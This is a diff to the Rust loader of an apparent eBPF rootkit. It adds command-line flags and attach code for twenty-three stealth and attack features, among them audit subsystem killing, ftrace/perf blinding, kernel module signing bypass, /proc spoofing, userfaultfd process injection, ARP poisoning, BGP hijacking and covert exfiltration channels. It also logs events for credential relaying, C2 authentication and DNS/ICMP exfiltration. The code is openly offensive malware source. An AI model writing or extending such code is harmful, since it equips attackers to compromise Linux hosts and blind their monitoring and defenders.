@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use aya::{
     include_bytes_aligned,
-    maps::{HashMap, MapData, RingBuf},
+    maps::{HashMap, MapData, ProgramArray, RingBuf},
     programs::{
         tc::{SchedClassifier, TcAttachType},
         KProbe, TracePoint, Xdp, XdpFlags,
@@ -12,12 +12,18 @@ use aya_log::EbpfLogger;
 use clap::Parser;
 use common::{
     CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig, TimestompEntry,
-    BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED,
-    EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE, EVENT_CRED_RELAYED,
-    EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL, EVENT_KALLSYMS_HIDDEN,
-    EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN,
-    EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
-    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
+    BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_ARP_POISONED,
+    EVENT_AUDIT_KILLED, EVENT_BGP_HIJACK, EVENT_BPF_CLOAKED, EVENT_BPF_ITER_ABUSED,
+    EVENT_BPF_LINK_PINNED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE,
+    EVENT_COREDUMP_SUPPRESSED, EVENT_CRED_RELAYED, EVENT_DNS_EXFIL, EVENT_DR_BREAKPOINT,
+    EVENT_FILE_OBFUSCATED, EVENT_FTRACE_BLINDED, EVENT_ICMP_EXFIL, EVENT_INITRAMFS_IMPLANT,
+    EVENT_INODE_SLACK_HIDE, EVENT_IPV6_EXT_ABUSE, EVENT_ISN_COVERT, EVENT_JOURNAL_MANIPULATED,
+    EVENT_KALLSYMS_HIDDEN, EVENT_KPROBE_DETECTED, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED,
+    EVENT_MODSIGN_BYPASS, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED,
+    EVENT_PMC_COVERT, EVENT_PORT_KNOCK_AUTH, EVENT_PROC_DEEP_SPOOF, EVENT_PROC_HIDDEN,
+    EVENT_SHM_COVERT_MSG, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED, EVENT_TAIL_CALL_CHAIN,
+    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED, EVENT_TSC_SIDECHAN, EVENT_UFFD_INJECTION,
+    EVENT_VDSO_HOOKED,
 };
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
@@ -107,6 +113,98 @@ struct Cli {
     /// Enable container escape probes
     #[arg(long)]
     enable_container_probe: bool,
+
+    /// Enable kprobe detection & evasion (F25)
+    #[arg(long)]
+    enable_kprobe_evasion: bool,
+
+    /// Enable eBPF tail-call chains (F26)
+    #[arg(long)]
+    enable_tail_calls: bool,
+
+    /// Enable ftrace/perf event blinding (F27)
+    #[arg(long)]
+    enable_ftrace_blind: bool,
+
+    /// Enable BPF iterator abuse (F28)
+    #[arg(long)]
+    enable_bpf_iter_abuse: bool,
+
+    /// Enable VDSO/vsyscall hooking (F29)
+    #[arg(long)]
+    enable_vdso_hook: bool,
+
+    /// Enable shared memory covert channel (F30)
+    #[arg(long)]
+    enable_shm_covert: bool,
+
+    /// Enable userfaultfd process injection (F31)
+    #[arg(long)]
+    enable_uffd_inject: bool,
+
+    /// Enable core dump suppression (F32)
+    #[arg(long)]
+    enable_coredump_suppress: bool,
+
+    /// Enable TCP ISN covert channel (F33)
+    #[arg(long)]
+    enable_isn_covert: bool,
+
+    /// Enable IPv6 extension header abuse (F34)
+    #[arg(long)]
+    enable_ipv6_ext: bool,
+
+    /// Enable ARP cache poisoning (F35)
+    #[arg(long)]
+    enable_arp_poison: bool,
+
+    /// Enable XDP port knocking daemon (F36)
+    #[arg(long)]
+    enable_port_knock: bool,
+
+    /// Enable BGP hijacking (F37)
+    #[arg(long)]
+    enable_bgp_hijack: bool,
+
+    /// Enable hardware breakpoint (DR register) abuse (F38)
+    #[arg(long)]
+    enable_dr_abuse: bool,
+
+    /// Enable CPU performance counter covert channel (F39)
+    #[arg(long)]
+    enable_pmc_covert: bool,
+
+    /// Enable TSC timing side channel (F40)
+    #[arg(long)]
+    enable_tsc_sidechan: bool,
+
+    /// Enable audit subsystem kill (F41)
+    #[arg(long)]
+    enable_audit_kill: bool,
+
+    /// Enable inode slack-space hiding (F42)
+    #[arg(long)]
+    enable_inode_slack: bool,
+
+    /// Enable ext4 journal manipulation (F43)
+    #[arg(long)]
+    enable_journal_manip: bool,
+
+    /// Enable /proc deep spoofing (F44)
+    #[arg(long)]
+    enable_proc_spoof: bool,
+
+    /// Enable initramfs implant detection (F45)
+    #[arg(long)]
+    enable_initramfs: bool,
+
+    /// Enable kernel module signing bypass (F46)
+    #[arg(long)]
+    enable_modsign_bypass: bool,
+
+    /// Enable BPF link pinning with obfuscated paths (F47)
+    #[arg(long)]
+    enable_bpf_obf_pin: bool,
 }
 
 struct C2Maps {
@@ -469,6 +567,288 @@ async fn main() -> Result<()> {
         commit_creds.load()?;
         commit_creds.attach("commit_creds", 0)?;
         info!("✓ Feature 23: Container Escape Probes loaded");
+    }
+
+    // ── Feature 25: Kprobe Detection & Evasion ──
+    if cli.enable_kprobe_evasion {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_register_kprobe")
+            .context("shadow_register_kprobe not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("register_kprobe", 0)?;
+        info!("✓ Feature 25: Kprobe Detection & Evasion attached");
+    }
+
+    // ── Feature 26: eBPF Tail-Call Chains ──
+    if cli.enable_tail_calls {
+        let stage1: &mut KProbe = bpf
+            .program_mut("shadow_tail_chain_stage1")
+            .context("shadow_tail_chain_stage1 not found")?
+            .try_into()?;
+        stage1.load()?;
+        let stage2: &mut KProbe = bpf
+            .program_mut("shadow_tail_chain_stage2")
+            .context("shadow_tail_chain_stage2 not found")?
+            .try_into()?;
+        stage2.load()?;
+        let entry: &mut KProbe = bpf
+            .program_mut("shadow_tail_chain_entry")
+            .context("shadow_tail_chain_entry not found")?
+            .try_into()?;
+        entry.load()?;
+        entry.attach("__x64_sys_getpid", 0)?;
+        let mut tail_progs = ProgramArray::try_from(
+            bpf.take_map("TAIL_CALL_PROGS").context("TAIL_CALL_PROGS not found")?,
+        )?;
+        let fd0 = bpf.program("shadow_tail_chain_stage1").unwrap().fd()?;
+        tail_progs.set(0, fd0, 0)?;
+        let fd1 = bpf.program("shadow_tail_chain_stage2").unwrap().fd()?;
+        tail_progs.set(1, fd1, 0)?;
+        info!("✓ Feature 26: eBPF Tail-Call Chains loaded");
+    }
+
+    // ── Feature 27: Ftrace/Perf Event Blinding ──
+    if cli.enable_ftrace_blind {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_perf_event_open")
+            .context("shadow_perf_event_open not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("perf_event_open", 0)?;
+        info!("✓ Feature 27: Ftrace/Perf Event Blinding attached");
+    }
+
+    // ── Feature 28: BPF Iterator Abuse ──
+    if cli.enable_bpf_iter_abuse {
+        let enter: &mut KProbe = bpf
+            .program_mut("shadow_bpf_iter_run_enter")
+            .context("shadow_bpf_iter_run_enter not found")?
+            .try_into()?;
+        enter.load()?;
+        enter.attach("bpf_iter_run_prog", 0)?;
+        let exit: &mut KProbe = bpf
+            .program_mut("shadow_bpf_iter_run_exit")
+            .context("shadow_bpf_iter_run_exit not found")?
+            .try_into()?;
+        exit.load()?;
+        exit.attach("bpf_iter_run_prog", 0)?;
+        info!("✓ Feature 28: BPF Iterator Abuse attached");
+    }
+
+    // ── Feature 29: VDSO/Vsyscall Hooking ──
+    if cli.enable_vdso_hook {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_vdso_setup")
+            .context("shadow_vdso_setup not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("arch_setup_additional_pages", 0)?;
+        info!("✓ Feature 29: VDSO/Vsyscall Hooking attached");
+    }
+
+    // ── Feature 30: Shared Memory Covert Channel ──
+    if cli.enable_shm_covert {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_shmat_enter")
+            .context("shadow_shmat_enter not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("do_shmat", 0)?;
+        info!("✓ Feature 30: Shared Memory Covert Channel attached");
+    }
+
+    // ── Feature 31: Userfaultfd Process Injection ──
+    if cli.enable_uffd_inject {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_uffd_ioctl")
+            .context("shadow_uffd_ioctl not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("userfaultfd_ioctl", 0)?;
+        info!("✓ Feature 31: Userfaultfd Process Injection attached");
+    }
+
+    // ── Feature 32: Core Dump Suppression ──
+    if cli.enable_coredump_suppress {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_do_coredump")
+            .context("shadow_do_coredump not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("do_coredump", 0)?;
+        info!("✓ Feature 32: Core Dump Suppression attached");
+    }
+
+    // ── Feature 33: TCP ISN Covert Channel (TC egress) ──
+    if cli.enable_isn_covert {
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_isn_covert")
+            .context("shadow_isn_covert not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, TcAttachType::Egress)?;
+        info!("✓ Feature 33: TCP ISN Covert Channel attached to {}", cli.iface);
+    }
+
+    // ── Feature 34: IPv6 Extension Header Abuse (TC egress) ──
+    if cli.enable_ipv6_ext {
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_ipv6_ext_abuse")
+            .context("shadow_ipv6_ext_abuse not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, TcAttachType::Egress)?;
+        info!("✓ Feature 34: IPv6 Extension Header Abuse attached to {}", cli.iface);
+    }
+
+    // ── Feature 35: ARP Cache Poisoning (XDP) ──
+    if cli.enable_arp_poison {
+        let prog: &mut Xdp = bpf
+            .program_mut("shadow_arp_poison")
+            .context("shadow_arp_poison not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, XdpFlags::default())?;
+        info!("✓ Feature 35: ARP Cache Poisoning attached to {}", cli.iface);
+    }
+
+    // ── Feature 36: XDP Port Knocking Daemon ──
+    if cli.enable_port_knock {
+        let prog: &mut Xdp = bpf
+            .program_mut("shadow_port_knock")
+            .context("shadow_port_knock not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, XdpFlags::default())?;
+        info!("✓ Feature 36: XDP Port Knocking attached to {}", cli.iface);
+    }
+
+    // ── Feature 37: BGP Hijacking (TC egress) ──
+    if cli.enable_bgp_hijack {
+        let prog: &mut SchedClassifier = bpf
+            .program_mut("shadow_bgp_hijack")
+            .context("shadow_bgp_hijack not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach(&cli.iface, TcAttachType::Egress)?;
+        info!("✓ Feature 37: BGP Hijacking attached to {}", cli.iface);
+    }
+
+    // ── Feature 38: Hardware Breakpoint (DR Register) Abuse ──
+    if cli.enable_dr_abuse {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_hw_breakpoint_install")
+            .context("shadow_hw_breakpoint_install not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("arch_install_hw_breakpoint", 0)?;
+        info!("✓ Feature 38: Hardware Breakpoint Abuse attached");
+    }
+
+    // ── Feature 39: CPU Performance Counter Covert Channel ──
+    if cli.enable_pmc_covert {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_perf_event_read_ret")
+            .context("shadow_perf_event_read_ret not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("perf_event_read", 0)?;
+        info!("✓ Feature 39: PMC Covert Channel attached");
+    }
+
+    // ── Feature 40: TSC Timing Side Channel ──
+    if cli.enable_tsc_sidechan {
+        let enter: &mut KProbe = bpf
+            .program_mut("shadow_tsc_check_enter")
+            .context("shadow_tsc_check_enter not found")?
+            .try_into()?;
+        enter.load()?;
+        enter.attach("crypto_skcipher_encrypt", 0)?;
+        let exit: &mut KProbe = bpf
+            .program_mut("shadow_tsc_check_exit")
+            .context("shadow_tsc_check_exit not found")?
+            .try_into()?;
+        exit.load()?;
+        exit.attach("crypto_skcipher_encrypt", 0)?;
+        info!("✓ Feature 40: TSC Timing Side Channel attached");
+    }
+
+    // ── Feature 41: Audit Subsystem Kill ──
+    if cli.enable_audit_kill {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_audit_receive_msg")
+            .context("shadow_audit_receive_msg not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("audit_receive_msg", 0)?;
+        info!("✓ Feature 41: Audit Subsystem Kill attached");
+    }
+
+    // ── Feature 42: Inode Slack-Space Hiding ──
+    if cli.enable_inode_slack {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_vfs_write_slack")
+            .context("shadow_vfs_write_slack not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("vfs_write", 0)?;
+        info!("✓ Feature 42: Inode Slack-Space Hiding attached");
+    }
+
+    // ── Feature 43: Ext4 Journal Manipulation ──
+    if cli.enable_journal_manip {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_journal_commit")
+            .context("shadow_journal_commit not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("jbd2_journal_commit_transaction", 0)?;
+        info!("✓ Feature 43: Ext4 Journal Manipulation attached");
+    }
+
+    // ── Feature 44: /proc Deep Spoofing ──
+    if cli.enable_proc_spoof {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_seq_read_enter")
+            .context("shadow_seq_read_enter not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("seq_read", 0)?;
+        info!("✓ Feature 44: /proc Deep Spoofing attached");
+    }
+
+    // ── Feature 45: Initramfs Implant ──
+    if cli.enable_initramfs {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_init_module")
+            .context("shadow_init_module not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("init_module", 0)?;
+        info!("✓ Feature 45: Initramfs Implant attached");
+    }
+
+    // ── Feature 46: Kernel Module Signing Bypass ──
+    if cli.enable_modsign_bypass {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_module_sig_check")
+            .context("shadow_module_sig_check not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("module_sig_check", 0)?;
+        info!("✓ Feature 46: Module Signing Bypass attached");
+    }
+
+    // ── Feature 47: BPF Link Pinning with Obfuscated Paths ──
+    if cli.enable_bpf_obf_pin {
+        let prog: &mut KProbe = bpf
+            .program_mut("shadow_bpf_obj_get")
+            .context("shadow_bpf_obj_get not found")?
+            .try_into()?;
+        prog.load()?;
+        prog.attach("bpf_obj_get", 0)?;
+        info!("✓ Feature 47: BPF Link Pinning attached");
     }
 
     // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
@@ -873,6 +1253,75 @@ fn log_event(event: &EventHeader) {
                 "Container probe: PID={}, ns_ino={}",
                 event.pid, event.context
             );
+        }
+        EVENT_KPROBE_DETECTED => {
+            warn!("Kprobe detected on our hook: PID={}, addr=0x{:x}", event.pid, event.context);
+        }
+        EVENT_TAIL_CALL_CHAIN => {
+            debug!("Tail-call chain executed: PID={}, stage={}", event.pid, event.context);
+        }
+        EVENT_FTRACE_BLINDED => {
+            info!("Ftrace/perf blinded: PID={}, target=0x{:x}", event.pid, event.context);
+        }
+        EVENT_BPF_ITER_ABUSED => {
+            info!("BPF iterator filtered: PID={}, iter_id={}", event.pid, event.context);
+        }
+        EVENT_VDSO_HOOKED => {
+            info!("VDSO page mapped: PID={}, addr=0x{:x}", event.pid, event.context);
+        }
+        EVENT_SHM_COVERT_MSG => {
+            debug!("SHM covert msg: PID={}, shm_id={}", event.pid, event.context);
+        }
+        EVENT_UFFD_INJECTION => {
+            info!("UFFD injection: PID={}, fault_addr=0x{:x}", event.pid, event.context);
+        }
+        EVENT_COREDUMP_SUPPRESSED => {
+            warn!("Core dump suppressed: PID={}, signal={}", event.pid, event.context);
+        }
+        EVENT_ISN_COVERT => {
+            debug!("ISN covert channel: PID={}, bytes={}", event.pid, event.context);
+        }
+        EVENT_IPV6_EXT_ABUSE => {
+            debug!("IPv6 ext header injected: PID={}, len={}", event.pid, event.context);
+        }
+        EVENT_ARP_POISONED => {
+            info!("ARP poisoned: target_ip=0x{:08x}", event.context as u32);
+        }
+        EVENT_PORT_KNOCK_AUTH => {
+            warn!("Port knock authenticated: src_ip=0x{:08x}", event.context as u32);
+        }
+        EVENT_BGP_HIJACK => {
+            warn!("BGP prefix announced: prefix=0x{:08x}", event.context as u32);
+        }
+        EVENT_DR_BREAKPOINT => {
+            warn!("HW breakpoint deflected: PID={}, addr=0x{:x}", event.pid, event.context);
+        }
+        EVENT_PMC_COVERT => {
+            debug!("PMC covert data: PID={}, val={}", event.pid, event.context);
+        }
+        EVENT_TSC_SIDECHAN => {
+            warn!("TSC anomaly detected: PID={}, delta_ns={}", event.pid, event.context);
+        }
+        EVENT_AUDIT_KILLED => {
+            warn!("Audit msg suppressed: PID={}, msg_type={}", event.pid, event.context);
+        }
+        EVENT_INODE_SLACK_HIDE => {
+            debug!("Slack-space write: PID={}, ino={}", event.pid, event.context);
+        }
+        EVENT_JOURNAL_MANIPULATED => {
+            info!("Journal manipulated: PID={}, dev_ino={}", event.pid, event.context);
+        }
+        EVENT_PROC_DEEP_SPOOF => {
+            info!("/proc spoofed: PID={}, target_pid={}", event.pid, event.context);
+        }
+        EVENT_INITRAMFS_IMPLANT => {
+            warn!("Initramfs implant: PID={}, mod_ptr=0x{:x}", event.pid, event.context);
+        }
+        EVENT_MODSIGN_BYPASS => {
+            warn!("Module sig check bypassed: PID={}", event.pid);
+        }
+        EVENT_BPF_LINK_PINNED => {
+            info!("BPF pin access: PID={}, path_ptr=0x{:x}", event.pid, event.context);
         }
         _ => {
             debug!("Unknown event: type={}", event.event_type);
